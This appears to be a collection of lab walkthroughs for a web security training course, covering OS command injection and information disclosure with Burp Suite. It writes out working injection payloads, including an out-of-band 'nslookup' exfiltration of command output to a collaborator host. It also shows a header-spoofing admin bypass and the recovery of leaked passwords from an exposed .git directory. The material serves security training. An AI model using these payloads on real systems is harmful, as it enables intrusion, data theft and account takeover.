# OS Command Injection

## OS command injection, simple case
1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the storeID parameter, giving it the value 1|whoami.
3. Observe that the response contains the name of the current user.

## Blind OS command injection with time delays
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=x||ping+-c+10+127.0.0.1||`
3. Observe that the response takes 10 seconds to return.

## Blind OS command injection with output redirection
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=||whoami>/var/www/images/output.txt||`
3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command:
    `filename=output.txt`
5. Observe that the response contains the output from the injected command.

## Blind OS command injection with out-of-band interaction
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

## Blind OS command injection with out-of-band data exfiltration
1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
    `email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`
5. Go back to the Burp Collaborator client window, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Burp Collaborator client. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user.

# Information disclosure

## Information disclosure in error messages
1. With Burp running, open one of the product pages.
2. In Burp, go to "Proxy" > "HTTP history" and notice that the GET request for product pages contains a productID parameter. Send the GET /product?productId=1 request to Burp Repeater. Note that your productId might be different depending on which product page you loaded.
3. In Burp Repeater, change the value of the productId parameter to a non-integer data type, such as a string. Send the request:
    `GET /product?productId="example"`
4. The unexpected data type causes an exception, and a full stack trace is displayed in the response. This reveals that the lab is using Apache Struts 2 2.3.31.
5. Go back to the lab, click "Submit solution", and enter 2 2.3.31 to solve the lab.

## Information disclosure on debug page
1. With Burp running, browse to the home page.
2. Go to the "Target" > "Site Map" tab. Right-click on the top-level entry for the lab and select "Engagement tools" > "Find comments". Notice that the home page contains an HTML comment that contains a link called "Debug". This points to /cgi-bin/phpinfo.php.
3. In the site map, right-click on the entry for /cgi-bin/phpinfo.php and select "Send to Repeater".
4. In Burp Repeater, send the request to retrieve the file. Notice that it reveals various debugging information, including the SECRET_KEY environment variable.
5. Go back to the lab, click "Submit solution", and enter the SECRET_KEY to solve the lab.

## Source code disclosure via backup files
1. Browse to /robots.txt and notice that it reveals the existence of a /backup directory. Browse to /backup to find the file ProductTemplate.java.bak. Alternatively, right-click on the lab in the site map and go to "Engagement tools" > "Discover content". Then, launch a content discovery session to discover the /backup directory and its contents.
2. Browse to /backup/ProductTemplate.java.bak to access the source code.
3. In the source code, notice that the connection builder contains the hard-coded password for a Postgres database.
4. Go back to the lab, click "Submit solution", and enter the database password to solve the lab.

## Authentication bypass via information disclosure
1. In Burp Repeater, browse to GET /admin. The response discloses that the admin panel is only accessible if logged in as an administrator, or if requested from a local IP.
2. Send the request again, but this time use the TRACE method:
    `TRACE /admin`
3. Study the response. Notice that the X-Custom-IP-Authorization header, containing your IP address, was automatically appended to your request. This is used to determine whether or not the request came from the localhost IP address.
4. Go to "Proxy" > "Options", scroll down to the "Match and Replace" section, and click "Add". Leave the match condition blank, but in the "Replace" field, enter:
    `X-Custom-IP-Authorization: 127.0.0.1`
    Burp Proxy will now add this header to every request you send.
5. Browse to the home page. Notice that you now have access to the admin panel, where you can delete Carlos.

## Information disclosure in version control history
1. Open the lab and browse to /.git to reveal the lab's Git version control data.
2. Download a copy of this entire directory. For Linux users, the easiest way to do this is using the command:
    `wget -r https://your-lab-id.web-security-academy.net/.git/`

    Windows users will need to find an alternative method, or install a UNIX-like environment, such as Cygwin, in order to use this command.
3. Explore the downloaded directory using your local Git installation. Notice that there is a commit with the message "Remove admin password from config".
4. Look closer at the diff for the changed admin.conf file. Notice that the commit replaced the hard-coded admin password with an environment variable ADMIN_PASSWORD instead. However, the hard-coded password is still clearly visible in the diff.
5. Go back to the lab and log in to the administrator account using the leaked password.
6. To solve the lab, open the admin interface and delete Carlos's account.





